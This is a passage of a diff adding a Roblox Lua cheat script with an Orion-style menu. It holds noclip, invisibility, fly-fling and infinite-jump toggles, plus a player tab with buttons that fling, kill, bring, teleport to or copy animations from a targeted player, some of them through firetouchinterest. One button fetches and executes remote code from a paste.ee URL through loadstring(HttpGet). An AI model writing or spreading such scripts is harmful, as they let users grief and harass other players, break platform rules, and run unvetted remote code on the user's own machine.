+    end
+  end
+               for i,v in pairs(plr.Character:GetDescendants()) do
+                   if v:IsA("BodyAngularVelocity") and v.Name == "FlyFling" then
+                      v:Destroy()
+                   end
+               end
+               vNoclip = false
+      if Noclipping then
+    Noclipping:Disconnect()
+  end
+  Clip = true
+  end
+  end    
+})
+
+Tab:AddTextbox({
+  Name = "Fly Fling Speed",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(vFlyspeedsz)
+    vehicleflyspeed = vFlyspeedsz
+    end	
+})
+Tab:AddToggle({
+  Name = "Show FPS",
+  Default = false,
+  Callback = function(ShowFPS)
+    if ShowFPS == true then
+               local ToolNameGrabber = Instance.new("ScreenGui", getParent)
+  local ToolNameTxt = Instance.new("TextLabel", getParent)
+  local player = cmdlp
+  ToolNameGrabber.Name = "ToolNameGrabber"
+  ToolNameGrabber.Parent = game.CoreGui
+  ToolNameGrabber.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+  ToolNameGrabber.Enabled = true
+  ToolNameTxt.Name = "ToolNameTxt"
+  ToolNameTxt.Parent = ToolNameGrabber
+  ToolNameTxt.BackgroundColor3 = Color3.new(1, 1, 1)
+  ToolNameTxt.BackgroundTransparency = 1
+  ToolNameTxt.BorderColor3 = Color3.new(0, 0, 0)
+  ToolNameTxt.Position = UDim2.new(0.894944727, 0, 0.952606618, 0)
+  ToolNameTxt.Size = UDim2.new(0, 133, 0, 30)
+  ToolNameTxt.Font = Enum.Font.GothamSemibold
+  ToolNameTxt.Text = "TextLabel"
+  ToolNameTxt.TextColor3 = Color3.new(0, 1, 0)
+  ToolNameTxt.TextScaled = true
+  ToolNameTxt.TextSize = 14
+  ToolNameTxt.TextWrapped = true
+  ToolNameTxt.Visible = true
+  local FpsLabel = ToolNameTxt
+  local Heartbeat = game:GetService("RunService").Heartbeat
+  local LastIteration, Start
+  local FrameUpdateTable = { }
+  local function HeartbeatUpdate()
+    LastIteration = tick()
+    for Index = #FrameUpdateTable, 1, -1 do
+      FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
+    end
+    FrameUpdateTable[1] = LastIteration
+    local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
+    CurrentFPS = CurrentFPS - CurrentFPS % 1
+    FpsLabel.Text = "" .. CurrentFPS .. " FPS"
+  end
+  Start = tick()
+  Heartbeat:Connect(HeartbeatUpdate)
+          else
+         ShowFPS = false
+               for i,fps in pairs(game.CoreGui:GetDescendants()) do
+           if fps.Name == "ToolNameGrabber" then
+             fps:Destroy()
+           end	   
+         end
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Ping",
+  Default = false,
+  Callback = function(ShowPing)
+    if ShowPing == true then
+               local PingGrabber = Instance.new("ScreenGui", getParent)
+  local ToolNameTxt = Instance.new("TextLabel", getParent)
+  local player = cmdlp
+  PingGrabber.Name = "PingGrabber"
+  PingGrabber.Parent = game.CoreGui
+  PingGrabber.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+  PingGrabber.Enabled = true
+  ToolNameTxt.Name = "ToolNameTxt"
+  ToolNameTxt.Parent = PingGrabber
+  ToolNameTxt.BackgroundColor3 = Color3.new(1, 1, 1)
+  ToolNameTxt.BackgroundTransparency = 1
+  ToolNameTxt.BorderColor3 = Color3.new(0, 0, 0)
+  ToolNameTxt.Position = UDim2.new(0.8, 0, 0.952606618, 0)
+  ToolNameTxt.Size = UDim2.new(0, 133, 0, 30)
+  ToolNameTxt.Font = Enum.Font.GothamSemibold
+  ToolNameTxt.Text = "TextLabel"
+  ToolNameTxt.TextColor3 = Color3.new(0, 1, 0)
+  ToolNameTxt.TextScaled = true
+  ToolNameTxt.TextSize = 14
+  ToolNameTxt.TextWrapped = true
+  ToolNameTxt.Visible = true
+  local PingLabel = ToolNameTxt
+  local Heartbeat = game:GetService("RunService").Heartbeat
+  local LastIteration, Start
+  local FrameUpdateTable = { }
+  local function HeartbeatUpdate()
+    LastIteration = tick()
+    for Index = #FrameUpdateTable, 1, -1 do
+      FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
+    end
+    FrameUpdateTable[1] = LastIteration
+    local Current_Ping = string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1]
+    Current_Ping = Current_Ping - Current_Ping % 1
+    PingLabel.Text = "Ping: " .. Current_Ping .. " ms"
+  end
+  Start = tick()
+  Heartbeat:Connect(HeartbeatUpdate)
+          else
+         ShowPing = false
+               for i,ping in pairs(game.CoreGui:GetDescendants()) do
+           if ping.Name == "PingGrabber" then
+             ping:Destroy()
+           end	   
+         end
+  end
+  end    
+})
+Tab:AddToggle({
+  Name = "Infinite Jump ",
+  Default = false,
+  Callback = function(jumpsFly)
+    if jumpsFly == true then
+               if flyjump then 
+            flyjump:Disconnect() 
+         end
+  flyjump = UserInputService.JumpRequest:Connect(function(Jump)
+    game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+  end)
+          else
+               jumpsFly = false
+               if flyjump then 
+          flyjump:Disconnect() 
+         end
+  end
+  end    
+})
+Tab:AddToggle({
+  Name = "Invisible",
+  Default = false,
+  Callback = function(invisibleofc)
+    if invisibleofc == true then
+              if invisRunning then return end
+  invisRunning = true
+  -- Full credit to AmokahFox @V3rmillion
+  local Player = plr
+  repeat wait(.1) until Player.Character
+  local Character = Player.Character
+  Character.Archivable = true
+  InvisibleCharacter = Character:Clone()
+  InvisibleCharacter.Parent = game:GetService'Lighting'
+  local Void = game.Workspace.FallenPartsDestroyHeight
+  InvisibleCharacter.Name = ""
+       invisFix = game:GetService("RunService").Stepped:Connect(function()
+    pcall(function()
+      local IsInteger
+      if tostring(Void):find'-' then
+        IsInteger = true
+      else
+        IsInteger = false
+      end
+      local Pos = Player.Character.HumanoidRootPart.Position
+      local Pos_String = tostring(Pos)
+      local Pos_Seperate = Pos_String:split(', ')
+      local X = tonumber(Pos_Seperate[1])
+      local Y = tonumber(Pos_Seperate[2])
+      local Z = tonumber(Pos_Seperate[3])
+      if IsInteger == true then
+        if Y <= Void then
+          invisRespawn()
+        end
+      elseif IsInteger == false then
+        if Y >= Void then
+          invisRespawn()
+        end
+      end
+    end)
+  end)
+        for i,v in pairs(InvisibleCharacter:GetDescendants())do
+    if v:IsA("BasePart") then
+      if v.Name == "HumanoidRootPart" then
+        v.Transparency = 1
+      else
+        v.Transparency = .5
+      end
+    end
+  end
+  invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
+    invisRespawn()
+    invisDied:Disconnect()
+  end)
+  if IsInvis == true then return end
+  IsInvis = true
+  CF = game.Workspace.CurrentCamera.CFrame
+  local CF_1 = Player.Character.HumanoidRootPart.CFrame
+  Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
+  game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+  wait(.2)
+  game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+  InvisibleCharacter = InvisibleCharacter
+  Character.Parent = game:GetService'Lighting'
+  InvisibleCharacter.Parent = game.Workspace
+  InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
+  Player.Character = InvisibleCharacter
+  fixcam()
+  Player.Character.Animate.Disabled = true
+  Player.Character.Animate.Disabled = false
+          else
+               invisibleofc = false
+         TurnVisible()
+  end
+  end    
+})
+Tab:AddToggle({
+  Name = "Noclip",
+  Default = false,
+  Callback = function(Noclip)
+        if Noclip == true then
+            Clip = false
+  wait(0.1)
+  local function NoclipLoop()
+    if Clip == false and plr.Character ~= nil then
+      for _, child in pairs(plr.Character:GetDescendants()) do
+        if child:IsA("BasePart") and child.CanCollide == true then
+          child.CanCollide = false
+        end
+      end
+    end
+  end
+  Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
+    else
+        Noclip = false
+      if Noclipping then
+    Noclipping:Disconnect()
+  end
+  Clip = true
+    end		
+  end    
+})
+Tab:AddToggle({
+  Name = "No Sit",
+  Default = false,
+  Callback = function(nosit)
+    if nosit == true then
+               if noSit then 
+          noSit:Disconnect() 
+          nositDied:Disconnect() 
+         end
+  noSit = Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
+  local function nositDiedFunc()
+    repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChildOfClass("Humanoid")
+    noSit:Disconnect()
+    noSit = Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
+  end
+  nositDied = plr.CharacterAdded:Connect(nositDiedFunc)
+          else
+               nosit = false
+               if noSit then 
+          noSit:Disconnect() 
+          nositDied:Disconnect() 
+         end
+  end
+  end    
+})
+Tab:AddButton({
+  Name = "Fling Touch",
+  Callback = function()
+        local player = game.Players.LocalPlayer
+local character1 = player.Character
+local mouse = player:GetMouse()
+
+local fakebody = Instance.new("Part", character1)
+fakebody.Transparency = 1
+fakebody.Anchored = true
+fakebody.CanCollide = false
+fakebody.Position = character1.Head.Position
+fakebody.Name = "FPart"
+wait()
+
+_G.ReanimationType = "Fling" --PDeath, Fling, Simple
+_G.Velocity = Vector3.new(36,0,0)
+_G.FlingBlock = true
+_G.FlingBlockTransparency = 1
+_G.HighlightFlingBlock = true
+_G.FlingBlockPosition = "FPart"
+_G.HighlightFlingBlockColor = Color3.fromRGB(255,0,0)
+
+loadstring(game:HttpGet("https://paste.ee/r/VwY6U"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Fling Attachment",
+  Callback = function()
+        loadcharacter(plr.Character)
+    end    
+})
+
+Tab:AddToggle({
+  Name = "Regular Fling",
+  Default = false,
+  Callback = function(flingto)
+    if flingto == true then
+              local RootPart = plr.Character.HumanoidRootPart
+    if not RootPart then return end
+    FlingTBL.OldVelocity = RootPart.Velocity
+    local bv = Instance.new("BodyAngularVelocity")
+    FlingTBL.bv = bv
+    bv.MaxTorque = Vector3.new(1, 1, 1) * math.huge
+    bv.P = math.huge
+    bv.AngularVelocity = Vector3.new(0, 9e5, 0)
+    bv.Parent = RootPart
+    local Char = plr.Character:GetChildren()
+    for i,v in next, Char do
+           if v:IsA("BasePart") then
+                   v.CanCollide = false
+                   v.Massless = true
+                   v.Velocity = Vector3.new(0,0,0)
+           end
+    end
+    FlingTBL.Noclipping2 = game:GetService("RunService").Stepped:Connect(function()
+            for i, v in next, Char do
+                    if v:IsA("BasePart") then
+                            v.CanCollide = false
+                    end
+            end
+    end)
+    if Regulars == false then
+    Regulars = true
+          else
+               flingto = false
+         local RootPart = plr.Character.HumanoidRootPart
+    if not RootPart then return end
+    FlingTBL.OldPos = RootPart.CFrame
+    local Char = plr.Character:GetChildren()
+    if FlingTBL ~= nil then
+            FlingTBL.bv:Destroy()
+            FlingTBL.bv = nil
+    end
+    if FlingTBL.Noclipping2 ~= nil then
+            FlingTBL.Noclipping2:Disconnect()
+            FlingTBL.Noclipping2 = nil
+    end
+    for i, v in next, Char do
+            if v:IsA("BasePart") then
+                    v.CanCollide = true
+                    v.Massless = false
+            end
+    end
+    FlingTBL.isRunning = game:GetService("RunService").Stepped:Connect(function()
+            if FlingTBL.OldPos ~= nil then
+                    RootPart.CFrame = FlingTBL.OldPos
+            end
+            if FlingTBL.OldVelocity ~= nil then
+                    RootPart.Velocity = FlingTBL.OldVelocity
+            end
+    end)
+    wait(2)
+  RootPart.Anchored = true
+  if FlingTBL.isRunning ~= nil then
+    FlingTBL.isRunning:Disconnect()
+    FlingTBL.isRunning = nil
+  end
+  RootPart.Anchored = false
+  if FlingTBL.OldVelocity ~= nil then
+    RootPart.Velocity = FlingTBL.OldVelocity
+  end
+  if FlingTBL.OldPos ~= nil then
+    RootPart.CFrame = FlingTBL.OldPos
+  end
+    for i,m in pairs(plr.Character.HumanoidRootPart:GetChildren()) do
+        if m.Name == "BodyAngularVelocity" then
+           m:Destroy()
+        end
+    end
+  wait()
+  FlingTBL.OldVelocity = nil
+  FlingTBL.OldPos = nil
+  Regulars = false
+end
+  end
+  end    
+})
+
+local Player = Window:MakeTab({
+  Name = "Players",
+  Icon = "rbxassetid://6034281935",
+  PremiumOnly = false
+})
+
+local Section = Player:AddSection({
+  Name = "Player"
+})
+
+local PlayerTarget
+local PlayerTargettwo
+
+Player:AddTextbox({
+  Name = "Player Name",
+  Default = "",
+  TextDisappear = false,
+  Callback = function(Walktofollow)
+    local Target = unpack(GetPlayer(Walktofollow))
+    PlayerTarget = Target
+  end		  
+})
+
+Player:AddButton({
+  Name = "Information about Player",
+  Callback = function()
+        OrionLib:MakeNotification({
+  Name = "Information about Player:",
+  Content = 'Name: '..PlayerTarget.Name..' | Character Name: '..PlayerTarget.Character.Name..' | DisplayName: '..PlayerTarget.DisplayName..' | Account Age: '..PlayerTarget.AccountAge..' | User ID: '..PlayerTarget.UserId..' | Health: '..round(PlayerTarget.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | WalkSpeed: '..PlayerTarget.Character:FindFirstChildOfClass("Humanoid").WalkSpeed..' | JumpPower: '..PlayerTarget.Character:FindFirstChildOfClass("Humanoid").JumpPower,
+  Image = "",
+  Time = 10
+})
+    end    
+})
+
+ Player:AddButton({
+  Name = "Teleport To Player",
+  Callback = function()
+        plr.Character.HumanoidRootPart.CFrame = getRoot(PlayerTarget.Character).CFrame
+    end    
+})
+
+Player:AddButton({
+  Name = "Vehicle Teleport to Player",
+  Callback = function()
+    if PlayerTarget.Character ~= nil then
+      local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
+      local vehicleModel = seat.Parent
+      repeat
+        if vehicleModel.ClassName ~= "Model" then
+          vehicleModel = vehicleModel.Parent
+        end
+      until vehicleModel.ClassName == "Model"
+      for i,v in pairs(vehicleModel.Parent:GetDescendants()) do
+        if v:IsA("BasePart") and v.Anchored then
+          if v.Anchored == false then
+           v:MoveTo(getRoot(PlayerTarget.Character).Position)
+          end
+        end   
+      end
+      wait(0.1)
+      vehicleModel:MoveTo(getRoot(PlayerTarget.Character).Position)
+  end
+  end    
+})
+
+Player:AddButton({
+  Name = "Fling Noclipped Player",
+  Callback = function()
+flinghh = 1000
+local lp = game.Players.LocalPlayer
+
+if type(PlayerTarget) == "string" then return end
+
+local oldpos = lp.Character.HumanoidRootPart.CFrame
+local oldhh = lp.Character.Humanoid.HipHeight
+
+local carpetAnim = Instance.new("Animation")
+carpetAnim.AnimationId = "rbxassetid://282574440"
+carpet = lp.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
+carpet:Play(.1, 1, 1)
+
+local carpetLoop
+
+local tTorso = PlayerTarget.Character:FindFirstChild("Torso") or PlayerTarget.Character:FindFirstChild("LowerTorso") or PlayerTarget.Character:FindFirstChild("HumanoidRootPart")
+
+spawn(function()
+    carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
+      pcall(function()
+          if tTorso.Velocity.magnitude <= 28 then -- if target uses netless just target their local position
+              local pos = {x=0, y=0, z=0}
+            pos.x = tTorso.Position.X
+            pos.y = tTorso.Position.Y
+            pos.z = tTorso.Position.Z
+            pos.x = pos.x + tTorso.Velocity.X / 2
+            pos.y = pos.y + tTorso.Velocity.Y / 2
+            pos.z = pos.z + tTorso.Velocity.Z / 2
+            lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))
+        else
+            lp.Character.HumanoidRootPart.CFrame = tTorso.CFrame
+        end
+      end)
+    end)
+end)
+
+wait()
+
+lp.Character.Humanoid.HipHeight = flinghh
+
+wait(.5)
+
+carpetLoop:Disconnect()
+wait()
+lp.Character.Humanoid.Health = 0
+wait(game.Players.RespawnTime + .6)
+lp.Character.HumanoidRootPart.CFrame = oldpos
+    end    
+})
+
+Player:AddToggle({
+  Name = "Fling Player",
+  Default = false,
+  Callback = function(Flinglol)
+        if Flinglol == true then
+            plr.Character.Humanoid.PlatformStand = Platformstand
+      Flinging = true
+  local Thrust = Instance.new("BodyThrust", plr.Character.HumanoidRootPart)
+  Thrust.Force = Vector3.new(100000, 100000, 100000)
+  Thrust.Name = "FlingForce"
+  repeat
+    plr.Character.HumanoidRootPart.CFrame = getRoot(PlayerTarget.Character).CFrame
+    Thrust.Location = getRoot(PlayerTarget.Character).Position
+    game:GetService('RunService').Heartbeat:Wait()
+  until not getRoot(PlayerTarget.Character) or Flinging == false
+    else
+        Flinglol = false
+      Flinging = false
+      plr.Character.Humanoid.PlatformStand = false
+  for i,v in pairs(plr.Character.HumanoidRootPart:GetChildren()) do
+    if v.Name == "FlingForce" and v:IsA("BodyThrust") then
+      v:Destroy()
+    end
+  end
+    end		
+  end    
+})
+Player:AddToggle({
+  Name = "PlatformStand Fling",
+  Default = false,
+  Callback = function(pFlinglol)
+        if pFlinglol == true then
+            Platformstand = true
+    else
+        pFlinglol = false
+      Platformstand = false
+    end		
+  end    
+})
+
+
+Player:AddButton({
+  Name = "Look At Player",
+  Callback = function()
+        local preMaxZoom = game.Players.LocalPlayer.CameraMaxZoomDistance
+  local preMinZoom = game.Players.LocalPlayer.CameraMinZoomDistance
+  if plr.CameraMaxZoomDistance ~= 0.5 then
+    preMaxZoom = plr.CameraMaxZoomDistance
+    preMinZoom = plr.CameraMinZoomDistance
+  end
+  plr.CameraMaxZoomDistance = 0.5
+  plr.CameraMinZoomDistance = 0.5
+  wait()
+    if PlayerTarget.Character and PlayerTarget.Character:FindFirstChild('Head') then
+      game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, PlayerTarget.Character.Head.CFrame.p)
+      wait(0.1)
+    end
+  plr.CameraMaxZoomDistance = preMaxZoom
+  plr.CameraMinZoomDistance = preMinZoom
+    end    
+})
+
+Player:AddButton({
+  Name = "unAnchored Parts to Player",
+  Callback = function()
+        if sethidden then
+      local Forces = {}
+      for _,part in pairs(game.Workspace:GetDescendants()) do
+        if PlayerTarget.Character:FindFirstChild("Head") and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(plr.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
+          for i,c in pairs(part:GetChildren()) do
+            if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
+              c:Destroy()
+            end
+          end
+          local ForceInstance = Instance.new("BodyPosition")
+          ForceInstance.Parent = part
+          ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+          table.insert(Forces, ForceInstance)
+          if not table.find(frozenParts,part) then
+            table.insert(frozenParts,part)
+          end
+        end
+      end
+      if not simRadius then
+        SimRad()
+      end
+      for i,c in pairs(Forces) do
+        c.Position = PlayerTarget.Character.Head.Position
+      end
+    end
+  end    
+})
+
+Player:AddButton({
+  Name = "Give Tools To Player",
+  Callback = function()
+        game.Players.LocalPlayer.Character.Humanoid.Name = 1
+local l = game.Players.LocalPlayer.Character["1"]:Clone()
+l.Parent = game.Players.LocalPlayer.Character
+l.Name = "Humanoid"
+wait(0.1)
+game.Players.LocalPlayer.Character["1"]:Destroy()
+game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
+game.Players.LocalPlayer.Character.Animate.Disabled = true
+wait(0.1)
+game.Players.LocalPlayer.Character.Animate.Disabled = false
+game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
+
+for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
+    if v:IsA("Tool") then
+       v.Parent = game:GetService("Players").LocalPlayer.Character
+    end
+end
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = getRoot(PlayerTarget.Character).CFrame
+    end    
+})
+Player:AddButton({
+  Name = "Bring Player",
+  Callback = function()
+        bring(speaker, PlayerTarget)
+    end    
+})
+
+Player:AddButton({
+  Name = "Fast Bring Player",
+  Callback = function()
+        bring(speaker, PlayerTarget, true)
+    end    
+})
+
+Player:AddButton({
+  Name = "Fast Bring Player [GodMode Method]",
+  Callback = function()
+        NOW = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+game.Players.LocalPlayer.Character.Humanoid.Name = 1
+local l = game.Players.LocalPlayer.Character["1"]:Clone()
+l.Parent = game.Players.LocalPlayer.Character
+l.Name = "Humanoid"
+wait(0.1)
+game.Players.LocalPlayer.Character["1"]:Destroy()
+game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
+game.Players.LocalPlayer.Character.Animate.Disabled = true
+wait(0.1)
+game.Players.LocalPlayer.Character.Animate.Disabled = false
+game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
+for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
+game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
+end
+local function tp(player,player2)
+local char1,char2=player.Character,player2.Character
+if char1 and char2 then
+char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
+end
+end
+local function getout(player,player2)
+local char1,char2=player.Character,player2.Character
+if char1 and char2 then
+char1:MoveTo(char2.HumanoidRootPart.Position)
+end
+end
+tp(PlayerTarget, game.Players.LocalPlayer)
+wait(0.1)
+tp(PlayerTarget, game.Players.LocalPlayer)
+wait(0.3)
+getout(game.Players.LocalPlayer, PlayerTarget)
+wait(0.2)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
+    end    
+})
+
+Player:AddButton({
+  Name = "Kill Player",
+  Callback = function()
+        kill(speaker, PlayerTarget)
+    end    
+})
+
+Player:AddButton({
+  Name = "Fast Kill Player",
+  Callback = function()
+        kill(speaker, PlayerTarget, true)
+    end    
+})
+
+Player:AddButton({
+  Name = "ToolHandle Kill Player",
+  Callback = function()
+        local Char = plr.Character
+local RS = game:GetService("RunService").RenderStepped
+local Tool = Char:FindFirstChildWhichIsA("Tool")
+local Handle = Tool and Tool:FindFirstChild("Handle")
+if not Tool or not Handle then
+   return game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You need to hold a 'Tool' that does damage on touchinterest. For example Sword or Knife.", Duration = 4,})
+end
+task.spawn(function()
+   while Tool and Char and PlayerTarget.Character and Tool.Parent == Char do
+           local Human = PlayerTarget.Character:FindFirstChildWhichIsA("Humanoid")
+           if not Human or Human.Health <= 0 then
+                   break
+           end
+           for i, v1 in ipairs(PlayerTarget.Character:GetChildren()) do
+                   v1 = ((v1:IsA("BasePart") and firetouchinterest(Handle, v1, 1, (RS.Wait(RS) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
+           end
+   end
+   game.StarterGui:SetCore("SendNotification", {Title = "Done!", Text = "ToolHandle Kill Stopped. Because player died/left or you just unequipped the tool.", Duration = 4,})
+end)
+    end    
+})
+Player:AddToggle({
+  Name = "View Player",
+  Default = false,
+  Callback = function(View)
+        if View == true then
+    if viewDied then
+      viewDied:Disconnect()
+      viewChanged:Disconnect()
+    end
+    viewing = PlayerTarget
+    game.Workspace.CurrentCamera.CameraSubject = viewing.Character
+    local function viewDiedFunc()
+      repeat wait() until PlayerTarget.Character ~= nil and getRoot(PlayerTarget.Character)
+      game.Workspace.CurrentCamera.CameraSubject = viewing.Character
+    end
+    viewDied = PlayerTarget.CharacterAdded:Connect(viewDiedFunc)
+    local function viewChangedFunc()
+      game.Workspace.CurrentCamera.CameraSubject = viewing.Character
+    end
+    viewChanged = game.Workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
+    else
+        View = false
+      if viewing ~= nil then
+    viewing = nil
+  end
+  if viewDied then
+    viewDied:Disconnect()
+    viewChanged:Disconnect()
+  end
+  game.Workspace.CurrentCamera.CameraSubject = plr.Character
+    end		
+  end    
+})
+
+Player:AddToggle({
+  Name = "Walk To Player",
+  Default = false,
+  Callback = function(Walkn)
+        if Walkn == true then
+            if plr.Character:FindFirstChildOfClass('Humanoid') and plr.Character:FindFirstChildOfClass('Humanoid').SeatPart then
+    plr.Character:FindFirstChildOfClass('Humanoid').Sit = false
+    wait(.1)
+  end
+      if WalkTo == false then
+    WalkTo = true
+    repeat wait()
+         plr.Character:FindFirstChild("Humanoid"):MoveTo(getRoot(PlayerTarget.Character).Position)
+       until PlayerTarget.Character == nil or not getRoot(PlayerTarget.Character) or WalkTo == false	
+  end
+    else
+        Walkn = false
+      WalkTo = false
+    end		
+  end    
+})
+
+Player:AddToggle({
+  Name = "Pathfind Walk To Player",
+  Default = false,
+  Callback = function(Walkns)
+        if Walkns == true then
+            WalkTo = false
+  local PathService = game:GetService("PathfindingService")
+  local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+  local path = PathService:CreatePath()
+
+  if WalkTo == false then
+    WalkTo = true
+  repeat wait()
+    local success, response = pcall(function()
+      path:ComputeAsync(getRoot(plr.Character).Position, getRoot(PlayerTarget.Character).Position)
+      local waypoints = path:GetWaypoints()
+      local distance 
+      for waypointIndex, waypoint in pairs(waypoints) do
+        local waypointPosition = waypoint.Position
+        hum:MoveTo(waypointPosition)
+        repeat 
+          distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
+          wait()
+        until
+        distance <= 5
+      end	 
+    end)
+    if not success then
+      plr.Character:FindFirstChildOfClass('Humanoid'):MoveTo(getRoot(PlayerTarget.Character).Position)
+    end
+    until PlayerTarget.Character == nil or not getRoot(PlayerTarget.Character) or WalkTo == false
+    end
+    else
+        Walkns = false
+      WalkTo = false
+    end		
+  end    
+})
+Player:AddToggle({
+  Name = "Walk To Tool Player",
+  Default = false,
+  Callback = function(Walknss)
+        if Walknss == true then
+           if Guarding == false then
+              Guarding = true
+                    repeat wait()
+                    if getRoot(PlayerTarget.Character).Velocity.Magnitude > 0.5 and PlayerTarget.Character:FindFirstChildOfClass("Tool") then
+                       plr.Character:FindFirstChildOfClass("Humanoid"):MoveTo(getRoot(PlayerTarget.Character).CFrame.p + getRoot(PlayerTarget.Character).Velocity.unit * 7)
+                    elseif getRoot(PlayerTarget.Character).Velocity.Magnitude < 0.5 and PlayerTarget.Character:FindFirstChildOfClass("Tool") then
+         plr.Character:FindFirstChild("Humanoid"):MoveTo(getRoot(PlayerTarget.Character).CFrame.p)
+end
+                    until PlayerTarget.Character == nil or not getRoot(PlayerTarget.Character) or not PlayerTarget.Character:FindFirstChildOfClass("Tool") or Guarding == false
+      end
+
+    else
+        Walknss = false
+            Guarding = false
+    end		
+  end    
+})
+
+Player:AddToggle({
+  Name = "Animation Steal Player",
+  Default = false,
+  Callback = function(animsteals)
+        if animsteals == true then
+            if not plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+               return game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You can't steal in R6 games. You need to be in R15 games - R15 is required!", Duration = 5,})
+      end
+      if not PlayerTarget.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+               return game.StarterGui:SetCore("SendNotification", {Title = "Oops.", Text = "The player is in R6 animation. Try to write other player target name. Your player target should be in R15 Animation - Player R15 is required!", Duration = 15,})
+      end
+      if PlayerTarget.Character:FindFirstChild("Animate") then
+    if plr.Character:FindFirstChild("Animate") then
+        checkifmyanim = plr.Character:FindFirstChild("animstorage")
+      if checkifmyanim then
+        local z = plr.Character:FindFirstChild("Animate")
+        if z then 
+           z:Destroy() 
+        end
+        checkifmyanim.Name = "Animate"
+        checkifmyanim.Disabled = false
+      end
+    end
+    local z = plr.Character:FindFirstChild("Animate")
+    if z then
+      z.Name = "animstorage"
+      z.Disabled = true
+    end
+    local newanim = PlayerTarget.Character.Animate:Clone()
+    newanim.Parent = plr.Character
+    newanim.Name = "Animate"
+      end
+    else
+        animsteals = false
+      if game.Players.LocalPlayer.Character:FindFirstChild("animstorage") then
+    if game.Players.LocalPlayer.Character:FindFirstChild("Animate") then
+      game.Players.LocalPlayer.Character:FindFirstChild("Animate"):Destroy()
+    end
+    local as = game.Players.LocalPlayer.Character:FindFirstChild("animstorage")
+    as.Name = "Animate"
+    as.Disabled = false
+    end
+    end
+  end   
+})
+
+Player:AddToggle({
+  Name = "Stare At Player",
+  Default = false,
+  Callback = function(Stareq)
+        if Stareq == true then
+    if stareLoop then
+      stareLoop:Disconnect()
+    end
+    if not plr.Character:FindFirstChild("HumanoidRootPart") and PlayerTarget.Character:FindFirstChild("HumanoidRootPart") then return end
+    local function stareFunc()
+      if plr.Character.PrimaryPart and PlayerTarget.Character ~= nil and PlayerTarget.Character:FindFirstChild("HumanoidRootPart") then
+        local chrPos= plr.Character.PrimaryPart.Position
+        local tPos= PlayerTarget.Character:FindFirstChild("HumanoidRootPart").Position
+        local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
+        local newCF=CFrame.new(chrPos,modTPos)
+        plr.Character:SetPrimaryPartCFrame(newCF)
+      elseif not PlayerTarget:FindFirstChild(game.Players) then
+        stareLoop:Disconnect()
+      end
+    end
+
+    stareLoop = game:GetService("RunService").RenderStepped:Connect(stareFunc)
+    else
+        Stareq = false
+      if stareLoop then
+    stareLoop:Disconnect()
+  end
+    end		
+  end    
+})
+local Section = Player:AddSection({
+  Name = "Two players"
+})
+
+Player:AddTextbox({
+  Name = "Player Name",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(Walktofollow)
+    local Target = unpack(GetPlayer(Walktofollow))
+    PlayerTargettwo = Target
+  end		  
+})
+
+Player:AddButton({
+  Name = "Teleport Player to Player",
+  Callback = function()
+        if getRoot(PlayerTarget.Character) and getRoot(PlayerTargettwo.Character) then
